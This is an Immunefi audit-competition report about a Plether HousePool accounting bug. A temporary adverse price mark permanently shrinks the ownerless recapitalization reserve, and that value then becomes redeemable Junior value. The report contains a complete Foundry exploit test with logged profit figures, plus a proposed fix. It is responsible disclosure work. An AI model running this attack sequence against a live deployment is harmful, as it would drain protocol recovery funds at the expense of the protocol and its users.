# \#99925 [SC-Medium] A temporary terminal liability permanently changes the owner of recapitalization surplus

**Submitted on Nov 15th 2026 at 18:33:32 UTC by @go4ko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99925
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The HousePool keeps `unassignedAssets` as a persistent record of canonical USDG that has no tranche owner. That amount is deliberately unavailable to ordinary LP withdrawals until governance assigns it and mints corresponding shares.

During reconciliation, however, the protocol uses terminal marked PnL to calculate `snapshot.distributable` and then overwrites the persistent reserve with the lower of its old value and that temporary marked amount:

```solidity
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable ? snapshot.distributable : state.unassignedAssets;
```

That operation is irreversible. A mark which temporarily makes traders profitable can reduce the stored reserve without transferring USDG or creating a trader claim. If the positions later close at their entry price, the liability disappears, but the removed reserve classification does not return. The next waterfall therefore treats the same physical cash as claimant equity: it restores Senior first and credits the remainder to Junior.

The PoC constructs the reserve using an actual Junior wipe, Senior impairment, and the documented owner recapitalization path. It then compares two executions from one snapshot:

- control: the balanced positions open and close at `1.00`; and
- exploit: the same positions are checkpointed once at `2.00`, then close at `1.00`.

Only the second ordering permanently removes **38,525.850055 USDG** from the 50,000-USDG recovery reserve. Wiped Junior shares subsequently redeem **9,500.028984 USDG**. After paying 1 USDG for those zero-NAV shares and supplying 24,000 USDG to the two trading accounts, the attack finishes **8,298.725692 USDG profitable**. In the control, the reserve remains 50,000 USDG, Junior withdrawal capacity remains zero, and the same funded route loses 1,199.620220 USDG.

The affected bucket is ownerless protocol recovery value, not a named user's principal or proven unclaimed yield. The demonstrated impact is therefore damage to protocol accounting and its recovery reserve, matching the quoted Medium griefing impact. Profitability proves exploitability; it does not change the ownership characterization.

## Vulnerability Details

### Root cause

`HousePoolAccountingLib.buildReconcileSnapshot` appropriately includes the live terminal price delta when calculating current LP equity:

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}
```

Using that marked result to restrict present withdrawals is sound. The bug is using it to destroy part of the source-of-funds ledger. `HousePoolReconcilePlanLib.planReconcile` mutates `plan.state.unassignedAssets`, and `HousePool._reconcile` commits it to storage:

```solidity
_setWaterfallState(plan.state.waterfall);
unassignedAssets = plan.state.unassignedAssets;
```

There is no corresponding state that remembers the marked impairment or restores it when terminal PnL reverses.

Let:

- `P` be canonical pool cash;
- `U` be stored ownerless reserve;
- `E` be Senior plus Junior principal; and
- `L` be a temporary terminal liability.

Before the mark, approximately `P = U + E`. When `L > E`, reconciliation stores:

```text
U' = P - L < U
```

After the positions return to entry, `P` is still present and the price liability is gone. Nevertheless, later reconciliation subtracts only `U'`, so `U - U'` enters the tranche waterfall. The source classification has changed even though no realized price loss, trader claim, governance assignment, or pool payout consumed the reserve.

### End-to-end attack sequence

1. Junior and Senior LPs deposit 120,000 USDG each through their public asynchronous vaults. Junior is deposited first, as required by the release lifecycle.
2. A balanced stress book opens at `1.00` and closes at `1.75`. Public LP settlement records a Junior wipe and Senior impairment.
3. The owner invokes the documented `recapitalizePool` action with the Senior deficit plus 50,000 USDG. Reconciliation restores Senior to its high-water mark and quarantines exactly 50,000 USDG as `unassignedAssets`.
4. The attacker pays 1 USDG for the surviving Junior shares after confirming their protocol conversion value is zero.
5. Two attacker accounts open a balanced 160,000-unit SHORT/LONG book at `1.00` in alternating 40,000-unit chunks. Each open stays within the configured 40% skew limit.
6. The attacker requests redemption of the wiped shares, waits for the real epoch, and permissionlessly settles at the configured `2.00` cap.
7. The protocol reports 158,560.000406 USDG of terminal trader liability and reduces stored `unassignedAssets` to 11,474.149945 USDG. Pool USDG is unchanged and `totalTraderClaimBalanceAssets()` remains zero. The zero-value request is refunded, preserving the shares.
8. Both positions close at their `1.00` entry. No price-PnL claim remains.
9. The reversal preview restores Senior and places more than the required 25%-of-Senior backing in Junior. The release 80% Senior-share rule therefore permits a real Junior redemption of 9,500.028984 USDG.
10. The two trading accounts recover 22,799.696708 USDG. Total wallet proceeds are 32,299.725692 USDG against 24,001 USDG supplied, for 8,298.725692 USDG net profit.

### Why this violates the intended ownership rule

The implementation documents recapitalization remainder as ownerless rather than Junior-owned:

> “Any remainder, including all value when there are no senior owners, becomes unassigned; recapitalization never accrues to junior principal.”

`assignUnassignedAssets` is the explicit owner-only route that consumes the reserve while minting matching shares. Its NatSpec explains that this prevents LPs from implicitly capturing previously ownerless value.

The tested recapitalization initially follows that rule. The mark-only checkpoint later moves 38,525.850055 USDG out of the reserve, and the reversal turns it into tranche value without calling `assignUnassignedAssets`. A temporary solvency haircut has therefore become a permanent ownership transfer.

### Release configuration and feasibility

The test restores the release values: `vpiFactor = 0.01`, `maxSkewRatio = 40%`, maintenance/init/FAD margins of 10/20/300 bps, 500-bps carry, 1-USDG minimum bounty, 10-bps bounty with a 50% keeper share, zero protocol share, 1,000-USDG minimum open notional, 25% adverse-confidence multiplier, 40M Senior cap, and an 80% maximum Senior share. It retains the fixture's release execution fee, settlement buffer, frozen spread, one-hour epochs/cooldowns, and `2.00` oracle cap. Only the permitted Pyth and USDG dependencies are mocked.

The adverse terminal liability must exceed claimed tranche principal before `unassignedAssets` starts shrinking. The PoC measures 120,002.097451 USDG of principal and 158,560.000406 USDG of liability at the 100% move. Scaling the measured liability gives a crossing point around **75.68%**. The test uses the valid cap move from `1.00` to `2.00`.

The full setup and attack price path is disclosed: `1.00 -> 1.75 -> 1.00 -> 2.00 -> 1.00`. The first move creates the recovery state; the last two moves are the reversible-mark attack. These large basket moves are the main practical limitation.

The Scope page states:

> “Feasibility limitations do not change the impact or severity of a finding, only the amount paid for it.”

## Impact Details

The demonstrated impact is the permanent reclassification of governance-funded, ownerless recovery assets into tranche value, followed by a real public Junior withdrawal. This damages the protocol's recovery accounting and reduces the reserve that governance deliberately excluded from ordinary LP ownership.

The PoC does **not** prove theft from a named LP, and it does not label the reserve as user-owned yield. The applicable impact is exactly:

> “Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)”

The attack happens to be profitable, but the Medium classification is based on the proven protocol damage rather than an unsupported ownership claim.

### Measured differential

| Quantity | Control | Marked path |
| --- | ---: | ---: |
| Initial `unassignedAssets` | 50,000.000000 | 50,000.000000 |
| Final `unassignedAssets` | 50,000.000000 | 11,474.149945 |
| Reserve classification erased | 0 | 38,525.850055 |
| Junior cash received | 0 | 9,500.028984 |
| Trading-account cash recovered | 22,801.379780 | 22,799.696708 |
| Result after 24,001 USDG supplied | **-1,199.620220** | **+8,298.725692** |

The report does not claim the entire erased amount is immediately withdrawable. The 80% Senior-share covenant retains most of the reclassified value as Junior backing; the table separately reports the actual funded wallet payout.

## Distinction from Disclosed Findings

The closest disclosed issue is **MED-26, “Owner can activate trading against ownerless pool assets.”** MED-26 concerns the false-to-true `activateTrading()` gate and was fixed by preventing initial activation while ownerless value exists. It expressly does not impose a continuous gate when ownerless value arises after activation. This PoC never reactivates trading: the pool is already active before the later loss and recovery. Its root is the irreversible storage write under unrealized PnL, which MED-26's activation check cannot prevent or repair.

**LOW-65, “Owner can misroute ownerless pool assets to the junior seed receiver,”** is also different. LOW-65 concerned `initializeSeedPosition` skipping reconciliation, allowing pre-seed accounted cash to be priced into the first Junior seed. Its fix reconciles before seeding. Here both seeds and ordinary LP deposits already exist; the reserve is correctly created after a later recapitalization and is subsequently erased by a terminal mark. Reconcile-before-seed cannot affect this path.

No disclosed prior item identified a reversible unrealized mark permanently reducing the stored `unassignedAssets` ownership ledger.

## Recommendation

Keep two concepts separate:

1. an effective marked reserve used for current NAV and withdrawal-capacity calculations; and
2. persistent `unassignedAssets`, which changes only when governance assigns it or a realized loss/outflow actually consumes it.

Do not overwrite the second value solely from terminal marked PnL. If the protocol must persist marked impairment, track it in a reversible field and restore the reserved ownership before distributing recovered value through the tranche waterfall.

Add a regression invariant covering `entry mark -> adverse mark -> entry mark` with no realized price PnL: after isolating ordinary fees, the ownership split between `unassignedAssets`, Senior, and Junior must return to the original split.

## References

- `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:68-85`
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:57-77`
- `packages/perps/src/HousePool.sol:653-703, 1555-1598`
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:103-107`
- `packages/perps/src/interfaces/IHousePool.sol:369-371`
- `packages/perps/ACCOUNTING_SPEC.md:308-357, 628-652`
- [Plether Scope page](https://immunefi.com/audit-competition/plether/scope/)

## Proof of Concept

## Proof of Concept

Save the following complete file as `packages/perps/test/perps/regression/ReserveClassificationRoundTrip.t.sol` in the frozen repository. `vm.snapshotState` is used only to compare mutually exclusive orderings from the same reachable state; it does not alter protocol storage or balances.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";

/// @notice A mark-only terminal loss permanently changes the ownership classification of recovery cash.
/// @dev The control and exploit branches start from the same recovered pool state. Only the Pyth and USDG test
///      dependencies are mocked; every protocol transition uses its ordinary production entry point.
contract ReserveClassificationRoundTripTest is HousePoolAsyncTestBase {

    address private constant JUNIOR_SEED = address(0x6101);
    address private constant SENIOR_SEED = address(0x6102);
    address private constant OLD_JUNIOR = address(0x6103);
    address private constant SENIOR_LP = address(0x6104);
    address private constant CLAIM_BUYER = address(0x6105);
    address private constant STRESS_LONG = address(0x6106);
    address private constant STRESS_SHORT = address(0x6107);
    address private constant ROUND_TRIP_LONG = address(0x6108);
    address private constant ROUND_TRIP_SHORT = address(0x6109);
    address private constant KEEPER = address(0x6110);

    uint256 private constant PAR = 1e8;
    uint256 private constant RECOVERY_CLOSE = 175_000_000;
    uint256 private constant ADVERSE_MARK = 2e8;

    uint256 private constant TRANCHE_DEPOSIT = 120_000e6;
    uint256 private constant RECOVERY_SURPLUS = 50_000e6;
    uint256 private constant SHARE_PRICE = 1e6;

    uint256 private constant STRESS_TOTAL_SIZE = 230_000e18;
    uint256 private constant STRESS_LEG_SIZE = 57_500e18;
    uint256 private constant STRESS_LEG_MARGIN = 3000e6;
    uint256 private constant STRESS_ACCOUNT_FUNDING = 36_000e6;

    uint256 private constant ROUND_TRIP_TOTAL_SIZE = 160_000e18;
    uint256 private constant ROUND_TRIP_LEG_SIZE = 40_000e18;
    uint256 private constant ROUND_TRIP_LEG_MARGIN = 400e6;
    uint256 private constant ROUND_TRIP_ACCOUNT_FUNDING = 12_000e6;

    struct BranchResult {
        uint256 reserveRemaining;
        uint256 juniorCash;
        uint256 traderCash;
        uint256 netResult;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return JUNIOR_SEED;
    }

    function _seniorSeedReceiver() internal pure override returns (address) {
        return SENIOR_SEED;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();

        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory releaseConfig = _routerConfig();
        releaseConfig.adverseConfidenceMultiplierBps = 2500;
        releaseConfig.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(releaseConfig);

        // Configuration finalization lands in the weekend closure in this fixture.
        vm.warp(block.timestamp + 1 days);
    }

    function test_RoundTripMarkConvertsRecoveryReserveIntoRedeemableJuniorValue() public {
        _reachRecoveredState();
        _buyWipedClaim();

        uint256 commonState = vm.snapshotState();
        BranchResult memory control = _runWithoutIntermediateMark();

        assertTrue(vm.revertToState(commonState));
        BranchResult memory exploit = _runWithIntermediateMark();

        assertEq(control.reserveRemaining, RECOVERY_SURPLUS, "control retains the recovery reserve");
        assertEq(control.juniorCash, 0, "control gives the wiped shares no cash");
        assertLt(control.netResult, 2 * ROUND_TRIP_ACCOUNT_FUNDING + SHARE_PRICE, "control is loss-making");

        assertLt(exploit.reserveRemaining, RECOVERY_SURPLUS, "mark checkpoint permanently reduces reserve ownership");
        assertGt(exploit.juniorCash, 0, "reclassified recovery cash funds a real Junior claim");
        assertGt(
            exploit.netResult,
            2 * ROUND_TRIP_ACCOUNT_FUNDING + SHARE_PRICE,
            "wallet proceeds exceed every attacker-supplied USDG"
        );

        emit log_named_decimal_uint("control reserve remaining", control.reserveRemaining, 6);
        emit log_named_decimal_uint("control Junior cash", control.juniorCash, 6);
        emit log_named_decimal_uint("control trader cash recovered", control.traderCash, 6);
        emit log_named_decimal_uint(
            "control trading loss", 2 * ROUND_TRIP_ACCOUNT_FUNDING + SHARE_PRICE - control.netResult, 6
        );
        emit log_named_decimal_uint("exploit reserve remaining", exploit.reserveRemaining, 6);
        emit log_named_decimal_uint("reserve classification erased", RECOVERY_SURPLUS - exploit.reserveRemaining, 6);
        emit log_named_decimal_uint("exploit Junior cash", exploit.juniorCash, 6);
        emit log_named_decimal_uint("exploit trader cash recovered", exploit.traderCash, 6);
        emit log_named_decimal_uint(
            "exploit net profit", exploit.netResult - 2 * ROUND_TRIP_ACCOUNT_FUNDING - SHARE_PRICE, 6
        );
    }

    function _runWithoutIntermediateMark() internal returns (BranchResult memory result) {
        _openRoundTripBook();
        _closeRoundTripBook();

        (uint256 projectedSenior, uint256 projectedJunior,, uint256 juniorCapacity) = pool.getPendingTrancheState();
        assertEq(projectedSenior, pool.seniorHighWaterMark(), "control restores Senior to its protected target");
        assertEq(juniorCapacity, 0, "intact reserve leaves no capacity for a Junior withdrawal");
        assertLt(projectedJunior, projectedSenior / 4, "control remains below the covenant backing floor");

        result.juniorCash = 0;
        result.traderCash = _withdrawRoundTripAccounts();
        result.reserveRemaining = pool.unassignedAssets();
        result.netResult = result.juniorCash + result.traderCash;
    }

    function _runWithIntermediateMark() internal returns (BranchResult memory result) {
        _openRoundTripBook();

        emit log_named_decimal_uint(
            "claimed tranche principal before mark", pool.seniorPrincipal() + pool.juniorPrincipal(), 6
        );

        _finishAsyncCooldown(juniorVault, CLAIM_BUYER);
        uint256 buyerShares = juniorVault.balanceOf(CLAIM_BUYER);
        uint256 adverseRequest = _requestAsyncRedeem(juniorVault, CLAIM_BUYER, buyerShares);
        _moveToRequestEpoch(adverseRequest);

        uint256 cashBefore = settlementToken.balanceOf(address(pool));
        _keeperSettle(ADVERSE_MARK);
        int256 terminalDelta = engine.terminalNavSnapshot().terminalLpPriceDeltaAssets;
        assertLt(terminalDelta, 0, "adverse mark must create an unrealized trader liability");
        emit log_named_decimal_uint("terminal trader liability at mark", uint256(-terminalDelta), 6);
        assertEq(settlementToken.balanceOf(address(pool)), cashBefore, "mark-only checkpoint cannot spend pool USDG");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "mark-only checkpoint cannot create a trader claim");
        assertLt(pool.unassignedAssets(), RECOVERY_SURPLUS, "temporary terminal loss must shrink stored reserve");
        assertEq(
            juniorVault.refundableRedeemRequest(adverseRequest, CLAIM_BUYER),
            buyerShares,
            "zero-value request must preserve the buyer's shares"
        );
        vm.prank(CLAIM_BUYER);
        juniorVault.claimRedeemRefund(adverseRequest, CLAIM_BUYER, CLAIM_BUYER);

        uint256 reserveAfterMark = pool.unassignedAssets();
        _closeRoundTripBook();
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "same-price closes leave no realized price claim");

        (uint256 projectedSenior, uint256 projectedJunior,, uint256 juniorCapacity) = pool.getPendingTrancheState();
        assertEq(projectedSenior, pool.seniorHighWaterMark(), "Senior returns to its protected target");
        assertGt(projectedJunior, projectedSenior / 4, "reclassification exceeds the 80% covenant backing floor");
        assertGt(juniorCapacity, 0, "the release covenant permits a funded Junior exit");

        result.juniorCash = _requestAndResolveBuyerExit(PAR);
        result.traderCash = _withdrawRoundTripAccounts();
        result.reserveRemaining = pool.unassignedAssets();
        result.netResult = result.juniorCash + result.traderCash;

        assertEq(result.reserveRemaining, reserveAfterMark, "price reversal does not restore reserve classification");
        assertGe(pool.juniorPrincipal() * 4, pool.seniorHighWaterMark(), "exit preserves required Junior backing");
    }

    function _reachRecoveredState() internal {
        _depositAndClaim(juniorVault, OLD_JUNIOR, TRANCHE_DEPOSIT, PAR);
        _depositAndClaim(seniorVault, SENIOR_LP, TRANCHE_DEPOSIT, PAR);

        _fundTrader(STRESS_LONG, STRESS_ACCOUNT_FUNDING);
        _fundTrader(STRESS_SHORT, STRESS_ACCOUNT_FUNDING);
        for (uint256 i; i < 4; ++i) {
            _executeV3(STRESS_SHORT, CfdTypes.Side.SHORT, STRESS_LEG_SIZE, STRESS_LEG_MARGIN, false, PAR);
            _executeV3(STRESS_LONG, CfdTypes.Side.LONG, STRESS_LEG_SIZE, STRESS_LEG_MARGIN, false, PAR);
        }

        _executeV3(STRESS_LONG, CfdTypes.Side.LONG, STRESS_TOTAL_SIZE, 0, true, RECOVERY_CLOSE);
        _executeV3(STRESS_SHORT, CfdTypes.Side.SHORT, STRESS_TOTAL_SIZE, 0, true, RECOVERY_CLOSE);
        _checkpointThroughOldJuniorRefund(RECOVERY_CLOSE);

        uint256 target = pool.seniorHighWaterMark();
        assertEq(pool.juniorPrincipal(), 0, "stress trade wipes Junior");
        assertLt(pool.seniorPrincipal(), target, "stress trade impairs Senior");

        uint256 ownerFunding = target - pool.seniorPrincipal() + RECOVERY_SURPLUS;
        settlementToken.mint(address(this), ownerFunding);
        settlementToken.approve(address(engine), ownerFunding);
        engine.recapitalizePool(ownerFunding);
        _checkpointThroughOldJuniorRefund(RECOVERY_CLOSE);

        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "owner action fully restores Senior");
        assertEq(pool.unassignedAssets(), RECOVERY_SURPLUS, "excess recovery is quarantined");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "recovery intent is fully reconciled");
    }

    function _buyWipedClaim() internal {
        uint256 shares = juniorVault.balanceOf(OLD_JUNIOR);
        assertGt(shares, 0, "old Junior holder retains shares");
        assertEq(juniorVault.convertToAssets(shares), 0, "acquired claim begins at zero protocol NAV");

        settlementToken.mint(CLAIM_BUYER, SHARE_PRICE);
        vm.prank(CLAIM_BUYER);
        settlementToken.transfer(OLD_JUNIOR, SHARE_PRICE);

        _finishAsyncCooldown(juniorVault, OLD_JUNIOR);
        vm.prank(OLD_JUNIOR);
        juniorVault.transfer(CLAIM_BUYER, shares);
    }

    function _openRoundTripBook() internal {
        _fundTrader(ROUND_TRIP_LONG, ROUND_TRIP_ACCOUNT_FUNDING);
        _fundTrader(ROUND_TRIP_SHORT, ROUND_TRIP_ACCOUNT_FUNDING);
        for (uint256 i; i < 4; ++i) {
            _executeV3(ROUND_TRIP_SHORT, CfdTypes.Side.SHORT, ROUND_TRIP_LEG_SIZE, ROUND_TRIP_LEG_MARGIN, false, PAR);
            _executeV3(ROUND_TRIP_LONG, CfdTypes.Side.LONG, ROUND_TRIP_LEG_SIZE, ROUND_TRIP_LEG_MARGIN, false, PAR);
        }
    }

    function _closeRoundTripBook() internal {
        _executeV3(ROUND_TRIP_SHORT, CfdTypes.Side.SHORT, ROUND_TRIP_TOTAL_SIZE, 0, true, PAR);
        _executeV3(ROUND_TRIP_LONG, CfdTypes.Side.LONG, ROUND_TRIP_TOTAL_SIZE, 0, true, PAR);

        (uint256 shortSize,,,,,,) = engine.positions(ROUND_TRIP_SHORT);
        (uint256 longSize,,,,,,) = engine.positions(ROUND_TRIP_LONG);
        assertEq(shortSize, 0, "short account closes completely");
        assertEq(longSize, 0, "long account closes completely");
    }

    function _withdrawRoundTripAccounts() internal returns (uint256 walletCash) {
        uint256 longCash = clearinghouse.balanceAssets(ROUND_TRIP_LONG);
        uint256 shortCash = clearinghouse.balanceAssets(ROUND_TRIP_SHORT);
        vm.prank(ROUND_TRIP_LONG);
        clearinghouse.withdraw(ROUND_TRIP_LONG, longCash);
        vm.prank(ROUND_TRIP_SHORT);
        clearinghouse.withdraw(ROUND_TRIP_SHORT, shortCash);
        walletCash = settlementToken.balanceOf(ROUND_TRIP_LONG) + settlementToken.balanceOf(ROUND_TRIP_SHORT);
    }

    function _requestAndResolveBuyerExit(
        uint256 price
    ) internal returns (uint256 paid) {
        _finishAsyncCooldown(juniorVault, CLAIM_BUYER);
        uint256 shares = juniorVault.balanceOf(CLAIM_BUYER);
        uint256 requestId = _requestAsyncRedeem(juniorVault, CLAIM_BUYER, shares);
        _moveToRequestEpoch(requestId);
        _keeperSettle(price);

        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, CLAIM_BUYER);
        if (claimableShares != 0) {
            uint256 beforeBalance = settlementToken.balanceOf(CLAIM_BUYER);
            vm.prank(CLAIM_BUYER);
            juniorVault.claimRedeem(requestId, claimableShares, CLAIM_BUYER, CLAIM_BUYER);
            paid = settlementToken.balanceOf(CLAIM_BUYER) - beforeBalance;
            return paid;
        }

        uint256 refundableShares = juniorVault.refundableRedeemRequest(requestId, CLAIM_BUYER);
        assertGt(refundableShares, 0, "unfunded control exit is refundable");
        vm.prank(CLAIM_BUYER);
        juniorVault.claimRedeemRefund(requestId, CLAIM_BUYER, CLAIM_BUYER);
    }

    function _depositAndClaim(
        TrancheVault vault,
        address provider,
        uint256 assets,
        uint256 price
    ) internal {
        settlementToken.mint(provider, assets);
        vm.startPrank(provider);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, provider, provider);
        vm.stopPrank();

        uint256 activation = vault.depositEpochStart(requestId);
        if (block.timestamp < activation) {
            vm.warp(activation);
        }
        _keeperSettle(price);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, provider);
        vm.prank(provider);
        assertGt(vault.claimDeposit(requestId, claimableAssets, provider, provider), 0, "deposit mints shares");
    }

    function _checkpointThroughOldJuniorRefund(
        uint256 price
    ) internal {
        _finishAsyncCooldown(juniorVault, OLD_JUNIOR);
        uint256 shares = juniorVault.balanceOf(OLD_JUNIOR);
        uint256 requestId = _requestAsyncRedeem(juniorVault, OLD_JUNIOR, shares);
        _moveToRequestEpoch(requestId);
        _keeperSettle(price);
        assertEq(juniorVault.refundableRedeemRequest(requestId, OLD_JUNIOR), shares, "wiped request is refundable");
        vm.prank(OLD_JUNIOR);
        juniorVault.claimRedeemRefund(requestId, OLD_JUNIOR, OLD_JUNIOR);
    }

    function _executeV3(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool close,
        uint256 price
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode(account, router.nextCommitId(), size, close));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = price;
        request.isClose = close;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });

        vm.prank(account);
        orderId = router.commitOrder(request);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory execution = router.executeOrder(orderId, _mockPythUpdateData(price));
        assertEq(uint8(execution.status), uint8(OrderV3Types.LifecycleStatus.Executed), "V3 order executes");
    }

    function _keeperSettle(
        uint256 price
    ) internal {
        vm.prank(KEEPER);
        router.settleLpEpoch(_mockPythUpdateData(price));
    }

    function _moveToRequestEpoch(
        uint256 requestId
    ) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) {
            vm.warp(maturity);
        }
    }

}
```

Run:

```sh
forge test --root packages/perps \
  --match-path test/perps/regression/ReserveClassificationRoundTrip.t.sol -vv
```

Expected result:

```text
Ran 1 test for test/perps/regression/ReserveClassificationRoundTrip.t.sol:ReserveClassificationRoundTripTest
[PASS] test_RoundTripMarkConvertsRecoveryReserveIntoRedeemableJuniorValue()
Logs:
  claimed tranche principal before mark: 120002.097451
  terminal trader liability at mark: 158560.000406
  control reserve remaining: 50000.000000
  control Junior cash: 0.000000
  control trader cash recovered: 22801.379780
  control trading loss: 1199.620220
  exploit reserve remaining: 11474.149945
  reserve classification erased: 38525.850055
  exploit Junior cash: 9500.028984
  exploit trader cash recovered: 22799.696708
  exploit net profit: 8298.725692

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

All logged amounts are USDG atoms rendered with six decimals.
